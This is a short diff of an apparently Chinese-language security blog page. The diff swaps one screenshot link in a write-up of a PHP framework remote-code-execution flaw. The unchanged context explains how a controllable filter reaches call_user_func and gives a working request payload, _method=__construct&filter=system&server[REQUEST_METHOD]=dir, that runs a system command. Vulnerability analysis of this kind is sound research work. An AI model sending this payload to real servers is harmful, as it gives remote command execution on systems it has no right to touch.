@@ -270,7 +270,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png" alt></p>
 <p>相当于$filter=$this-&gt;filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造：</p>
 <pre><code>_method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329003844.png" alt></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004703.png" alt></p>
 <p>成功执行，危害极大。</p>
 
         </div>
